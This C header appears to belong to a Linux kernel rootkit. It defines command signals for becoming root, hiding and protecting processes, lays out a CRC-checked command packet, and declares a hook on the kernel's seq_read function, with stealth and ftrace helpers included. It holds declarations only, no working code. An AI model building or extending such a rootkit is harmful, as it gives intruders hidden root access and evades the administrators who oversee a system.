#ifndef MAIN_H
#define MAIN_H

#include <linux/err.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/namei.h>
#include <linux/path.h>
#include <linux/pid.h>
#include <linux/rwlock.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/types.h>
#include <linux/version.h>

#include "ftrace_helper.h"
#include "stealth_helper.h"
#include "utils.h"
#include "king.h"

/* Enum for the different command signals */
enum {
  SIG_GOD = 0xFF,
  SIG_HIDE = 0xFA,
  SIG_PROTECT = 0xFB,
  SIG_ROOT = 0xBA,
};

enum {
  /* Component sizes */
  CMD_SIZE = sizeof(char),
  RAND_BYTES_SIZE = 4 * sizeof(char),
  PID_SIZE = sizeof(pid_t),
  CRC_SIZE = sizeof(uint32_t),

  TOTAL_SIZE = CMD_SIZE + RAND_BYTES_SIZE + PID_SIZE + CRC_SIZE,

  /* Offsets */
  PID_OFFSET = TOTAL_SIZE - (PID_SIZE + CRC_SIZE),
  CRC_OFFSET = TOTAL_SIZE - CRC_SIZE
};

void sig_handle(const uint32_t sig, pid_t pid);

void extract_components(
    char *buf, 
    uint8_t *sig,
    pid_t *pid, 
    uint32_t *crc
);

extern asmlinkage ssize_t (*orig_seq_read)(
    struct file *file, 
    char __user *buf, 
    size_t size, 
    loff_t *ppos
);
extern asmlinkage ssize_t hook_seq_read(
    struct file *file, 
    char __user *buf,
    size_t size, 
    loff_t *ppos
);

#endif